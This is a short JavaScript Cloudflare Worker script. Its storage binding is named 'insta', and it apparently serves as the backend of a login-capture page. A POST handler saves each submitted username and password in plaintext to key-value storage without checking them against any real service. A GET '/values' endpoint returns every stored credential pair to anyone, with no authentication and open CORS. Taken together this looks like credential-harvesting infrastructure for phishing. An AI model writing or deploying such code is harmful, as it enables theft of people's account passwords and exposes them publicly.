const kvNamespace = insta; // Make sure this is the correct binding name for your KV

async function handleLoginRequest(request) {
    try {
        const { username, password } = await request.json();

        // Save to KV store (replace with your logic)
        await kvNamespace.put(username, password); // Change this line if you want a different storage mechanism

        return new Response(JSON.stringify({ success: true }), {
            headers: {
                'Content-Type': 'application/json',
                'Access-Control-Allow-Origin': '*', // Allow CORS
                'Access-Control-Allow-Methods': 'POST, GET', // Allow methods
            },
        });
    } catch (error) {
        return new Response(JSON.stringify({ success: false, error: error.message }), {
            status: 500,
            headers: {
                'Content-Type': 'application/json',
                'Access-Control-Allow-Origin': '*',
            },
        });
    }
}

async function handleGetValuesRequest() {
    try {
        const keys = await kvNamespace.list(); // Get all keys
        const values = await Promise.all(
            keys.keys.map(async (key) => {
                const value = await kvNamespace.get(key.name);
                return { key: key.name, value }; // Store key and its value
            })
        );

        return new Response(JSON.stringify(values), {
            headers: {
                'Content-Type': 'application/json',
                'Access-Control-Allow-Origin': '*',
            },
        });
    } catch (error) {
        return new Response(JSON.stringify({ success: false, error: error.message }), {
            status: 500,
            headers: {
                'Content-Type': 'application/json',
                'Access-Control-Allow-Origin': '*',
            },
        });
    }
}

addEventListener('fetch', event => {
    const url = new URL(event.request.url);
    
    if (event.request.method === 'POST' && url.pathname === '/') {
        event.respondWith(handleLoginRequest(event.request));
    } else if (event.request.method === 'GET' && url.pathname === '/values') {
        event.respondWith(handleGetValuesRequest());
    } else {
        event.respondWith(new Response('Not Found', { status: 404 }));
    }
});
